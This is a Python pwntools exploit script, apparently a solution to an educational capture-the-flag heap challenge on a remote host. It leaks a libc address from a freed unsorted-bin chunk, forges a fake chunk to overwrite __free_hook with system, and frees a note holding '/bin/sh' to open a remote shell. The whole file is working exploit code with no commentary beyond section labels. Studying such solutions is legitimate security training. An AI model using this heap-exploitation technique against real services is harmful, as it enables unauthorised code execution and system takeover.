from pwn import *

# r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10007)

context.arch = 'amd64'

def add_note(idx, note_name):
    r.sendafter(b'> ', b'1')
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendafter(b'note name\n> ', note_name)

def edit_note(idx, note_size, message):
    r.sendafter(b"> ", b"2")
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendlineafter(b'size\n> ', str(note_size))
    r.send(message)

def delete_note(idx):
    r.sendafter(b"> ", b"3")
    r.sendlineafter(b'index\n> ', str(idx))

def show_note():
    r.sendafter(b"> ", b"4")

'''------------------
Construct heap memory
------------------'''
add_note(0, b'a'*8)
edit_note(0, 0x418, b'a')

add_note(1, b'b'*8)
edit_note(1, 0x18, b'b')

add_note(2, b'c'*8)

'''------------------
Leak libc address
------------------'''
delete_note(0)
show_note()
r.recvuntil(b'data:')
libc = (u64(r.recv(8)) >> 8) - 0x1ecbe0 - 0xa000000000000
info(f"libc address: {hex(libc)}")
free_hook_addr = libc + 0x1eee48
info(f"__free_hook address: {hex(free_hook_addr)}")
libc_sys_addr = libc + 0x52290
info(f"__libc_system address: {hex(libc_sys_addr)}")

# unsorted_bin_fd = r.recv(8)
# print(unsorted_bin_fd)
# unsorted_bin_fd = u64(unsorted_bin_fd)
# print(unsorted_bin_fd)
# unsorted_bin_fd = unsorted_bin_fd >> 8
# print(unsorted_bin_fd)
# libc = unsorted_bin_fd - 0x1ecbe0 - 0xa000000000000

'''------------------
Construct fake chunk
------------------'''
data = b'/bin/sh\x00'.ljust(0x10, b'b')
fake_chunk = flat(
    0, 0x21,
    b'cccccccc', b'cccccccc',
    free_hook_addr
)

edit_note(1, 0x38, data + fake_chunk)
edit_note(2, 0x8, p64(libc_sys_addr))
delete_note(1)

r.interactive()